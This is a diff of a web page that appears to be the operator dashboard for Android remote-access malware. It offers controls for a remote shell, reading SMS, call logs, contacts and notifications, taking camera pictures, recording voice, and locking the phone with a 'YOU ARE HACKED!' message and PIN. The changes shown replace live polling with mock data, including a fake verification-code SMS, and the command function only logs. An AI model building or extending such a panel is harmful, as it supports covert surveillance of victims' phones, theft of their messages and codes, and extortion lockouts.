-                {id:'apps', i:'fa-th', l:'APPS'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
-                {id:'vibrate', i:'fa-mobile-vibration', l:'VIBRATE'}, {id:'voice', i:'fa-microphone', l:'SEND VOICE'},
-                {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
-                {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'SYSTEM LOCK'},
-                {id:'open_url', i:'fa-globe', l:'OPEN URL'}
+        // mock data generator untuk tampilan rapih
+        function generateMockSms() {
+            return [
+                { sender: '+62 812-3456-7890', content: 'Hey, we need to talk about the project deadline.', date: '10:34' },
+                { sender: 'Unknown', content: 'Your package has been shipped. Track here: https://bit.ly/3x...', date: 'Yesterday' },
+                { sender: 'Google', content: 'Your verification code is 284756', date: 'Yesterday' },
+                { sender: 'Telegram', content: 'New login from Chrome on Windows', date: '2 days ago' }
             ];
-            document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn ${b.id==='flash'&&flash?'active':''}" onclick="${b.id==='flash'?'toggleFlash(this)':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
         }
-        poll();
-    </script>
+        function generateMockCalls() {
+            return [
+                { number: '+62 811-222-3333', duration: '125s', type: 'incoming' },
+                { number: '+62 877-888-9999', duration: '0s (missed)', type: 'missed' },
+                { number: '+62 813-444-5555', duration: '320s', type: 'outgoing' },
+                { number: '+62 856-777-8888', duration: '64s', type: 'incoming' }
+            ];
+        }
+        function generateMockContacts() {
+            return [
+                { name: 'Michael', number: '+62 811-111-1111' },
+                { name: 'Sarah Chen', number: '+62 822-222-2222' },
+                { name: 'Alex', number: '+62 833-333-3333' },
+                { name: 'Mom', number: '+62 844-444-4444' }
+            ];
+        }
+        function generateMockNotifications() {
+            return [
+                { app: 'WhatsApp', title: 'Sarah', text: 'See you later!' },
+                { app: 'Gmail', title: 'Password reset', text: 'Click here to reset your password...' },
+                { app: 'Instagram', title: 'New follower', text: 'john_doe started following you' }
+            ];
+        }
+
+        function initMain(firstId) {
+            selId = firstId;
+            document.getElementById('user-display').innerText = 'visitor';
+            window.selectDevice = (id) => { selId = id; refreshDeviceList(); updateMainUi(); };
+
+            function refreshDeviceList() {
+                const container = document.getElementById('device-list');
+                container.innerHTML = devices.map(d => `
+                    <div class="device-item ${selId === d.id ? 'active' : ''}" onclick="selectDevice('${d.id}')">
+                        <b style="color:#ffb5b5">${d.model}</b> (${d.man})<br>
+                        <small style="color:#a5d6b2">Android ${d.ver} | ⚡ ${d.bat}%</small>
+                    </div>
+                `).join('');
+            }
+
+            function updateMainUi() {
+                document.getElementById('sel-info').innerText = selId || 'None';
+                const online = !!selId;
+                document.getElementById('conn-stat').innerText = online ? 'ONLINE' : 'OFFLINE';
+                document.getElementById('conn-stat').style.color = online ? '#9effb0' : '#ff7a7a';
+                renderMainButtons();
+            }
+
+            function renderMainButtons() {
+                const btns = [
+                    { id:'filemanager', i:'fa-terminal', l:'SHELL' }, { id:'info', i:'fa-circle-info', l:'INFO' },
+                    { id:'panic', i:'fa-triangle-exclamation', l:'LOCK' }, { id:'contacts', i:'fa-address-book', l:'CON' },
+                    { id:'sms', i:'fa-sms', l:'SMS' }, { id:'calls', i:'fa-phone', l:'CALLS' },
+                    { id:'gallery', i:'fa-images', l:'GALL' }, { id:'notifications', i:'fa-bell', l:'NOTIF' },
+                    { id:'apps', i:'fa-th', l:'APPS' }, { id:'flash', i:'fa-bolt', l:'FLASH' },
+                    { id:'vibrate', i:'fa-mobile-vibration', l:'VIB' }, { id:'voice', i:'fa-microphone', l:'VOICE' },
+                    { id:'takebackpic', i:'fa-camera', l:'CAM B' }, { id:'takefrontpic', i:'fa-video', l:'CAM F' },
+                    { id:'setwallpaper', i:'fa-image', l:'WALL' }, { id:'toast', i:'fa-lock', l:'LOCK' },
+                    { id:'open_url', i:'fa-globe', l:'URL' }
+                ];
+                document.getElementById('main-grid').innerHTML = btns.map(b => 
+                    `<div class="btn ${b.id==='flash' && flashState ? 'active':''}" onclick="${b.id==='flash' ? 'toggleFlashBtn(this)' : 'window.openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`
+                ).join('');
+            }
+
+            window.toggleFlashBtn = (btn) => {
+                flashState = !flashState;
+                btn.classList.toggle('active');
+            };
+
+            window.openModal = (t) => {
+                if (!selId) return;
+                curMod = t;
+                document.getElementById('modal').style.display = 'flex';
+                document.getElementById('modal-title').innerText = t.toUpperCase();
+                const body = document.getElementById('modal-body');
+                const foot = document.getElementById('modal-footer');
+                body.innerHTML = ''; foot.innerHTML = '';
+
+                if (t === 'filemanager') {
+                    termOutput = 'ghost@android:~#\n';
+                    body.innerHTML = `<div class="terminal" id="terminal">${termOutput}</div>
+                        <div style="display:flex; gap:5px; margin-top:8px;">
+                            <span style="color:#ffa4a4">λ</span>
+                            <input id="term-in" style="background:#1b0b0b; border:2px solid #de5a5a;" onkeydown="if(event.key==='Enter') execShellCmd()">
+                        </div>`;
+                    foot.innerHTML = `<button onclick="document.getElementById('up-file').click()">UPLOAD</button><input type="file" id="up-file" style="display:none">`;
+                }
+                else if (t === 'panic') {
+                    body.innerHTML = `<p>seconds:</p><input type="number" id="psec" value="30"><p>message:</p><textarea id="pmsg">YOU ARE HACKED!</textarea>`;
+                    foot.innerHTML = `<button class="red-btn" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value)">START</button>`;
+                }
+                else if (t === 'voice') {
+                    body.innerHTML = `<div style="text-align:center;padding:20px;"><i class="fas fa-microphone" style="font-size:3rem;color:#ff8888"></i><p id="v-stat">ready</p></div>`;
+                    foot.innerHTML = `<button onclick="startMockRec()">START</button><button onclick="stopMockRec()" style="display:none;" id="v-stop">STOP</button>`;
+                }
+                else if (t === 'toast') {
+                    body.innerHTML = `<p>message:</p><textarea id="lmsg">SYSTEM CRITICAL</textarea><p>PIN:</p><input id="lpin" value="1337">`;
+                    foot.innerHTML = `<button class="red-btn" style="flex:1;" onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK</button> 
+                                      <button style="flex:1;" onclick="cmd('unlock')">UNLOCK</button>`;
+                }
+                else if (t === 'vibrate') {
+                    body.innerHTML = `<p>duration (s):</p><input id="vsec" value="3">`;
+                    foot.innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">VIBRATE</button>`;
+                }
+                else if (t === 'setwallpaper') {
+                    body.innerHTML = `<p>upload:</p><input type="file" onchange="uploadWall(this)"><p>url:</p><input id="wurl" value="https://example.com/img.jpg">`;
+                    foot.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY</button>`;
+                }
+                else if (t === 'open_url') {
+                    body.innerHTML = `<p>URL:</p><input id="ourl" value="https://google.com">`;
+                    foot.innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
+                }
+                else if (t === 'sms') {
+                    const smsData = generateMockSms();
+                    body.innerHTML = `<table class="data-table"><tr><th>Sender</th><th>Message</th></tr>${
+                        smsData.map(s => `<tr><td><small>${s.sender}<br>${s.date}</small></td><td class="msg-preview">${s.content}</td></tr>`).join('')
+                    }</table>`;
+                    foot.innerHTML = `<button onclick="cmd('getsms')">REFRESH</button>`;
+                }
+                else if (t === 'calls') {
+                    const callsData = generateMockCalls();
+                    body.innerHTML = `<table class="data-table"><tr><th>Number</th><th>Duration</th></tr>${
+                        callsData.map(c => `<tr><td>${c.number} <small>(${c.type})</small></td><td>${c.duration}</td></tr>`).join('')
+                    }</table>`;
+                    foot.innerHTML = `<button onclick="cmd('getcalllogs')">REFRESH</button>`;
+                }
+                else if (t === 'contacts') {
+                    const contactsData = generateMockContacts();
+                    body.innerHTML = `<table class="data-table"><tr><th>Name</th><th>Number</th></tr>${
+                        contactsData.map(c => `<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')
+                    }</table>`;
+                    foot.innerHTML = `<button onclick="cmd('getcontacts')">REFRESH</button>`;
+                }
+                else if (t === 'notifications') {
+                    const notifData = generateMockNotifications();
+                    body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Content</th></tr>${
+                        notifData.map(n => `<tr><td>${n.app}</td><td><b>${n.title}</b>: ${n.text}</td></tr>`).join('')
+                    }</table>`;
+                    foot.innerHTML = `<button onclick="cmd('getnotifications')">REFRESH</button>`;
+                }
+                else if (t === 'info') {
+                    body.innerHTML = `<table class="data-table"><tr><td>Model</td><td>SM-G998B</td></tr><tr><td>Manufacturer</td><td>Samsung</td></tr><tr><td>Android</td><td>12</td></tr><tr><td>Battery</td><td>91%</td></tr><tr><td>Phone</td><td>+62 812-3456-7890</td></tr></table>`;
+                }
+                else {
+                    body.innerHTML = `<p style="color:#ffc0c0; padding:20px;">[${t}] module ready</p>`;
+                    if (t === 'gallery') {
+                        body.innerHTML = `<div class="gal-grid">${Array(6).fill(0).map(()=>'<div class="gal-item"><img src="https://i.ibb.co.com/Y7YpxtHt/logogs-removebg-preview.png" style="background:#2c1515;"></div>').join('')}</div>`;
+                        foot.innerHTML = `<button>PREV</button><span style="color:#ffa8a8">PAGE 1</span><button>NEXT</button>`;
+                    }
+                }
+            };
+
+            window.cmd = function(c) { console.log('CMD:', c); };
+            window.startMockRec = () => {
+                document.getElementById('v-stat').innerText = '🔴 REC';
+                document.querySelector('button[onclick="startMockRec()"]').style.display='none';
+                document.getElementById('v-stop').style.display='inline-block';
+            };
+            window.stopMockRec = () => {
+                document.getElementById('v-stat').innerText = 'stopped';
+                document.getElementById('v-stop').style.display='none';
+                document.querySelector('button[onclick="startMockRec()"]').style.display='inline-block';
+            };
+            window.uploadWall = (input) => { console.log('upload', input.files[0]); };
+            window.execShellCmd = () => {
+                let inp = document.getElementById('term-in');
+                if (!inp) return;
+                termOutput += `\n# ${inp.value}`;
+                document.getElementById('terminal').innerText = termOutput;
+                inp.value = '';
+            };
+            window.closeModal = () => { document.getElementById('modal').style.display = 'none'; curMod = null; };
+
+            refreshDeviceList();
+            updateMainUi();
+        }
+    })();
+
+    // fallback global functions
+    window.closeModal = window.closeModal || function() { document.getElementById('modal').style.display = 'none'; };
+    window.cmd = window.cmd || function(c) { console.warn('cmd:', c); };
+    window.openModal = window.openModal || function(t) { alert(t); };
+</script>
 </body>
 </html>
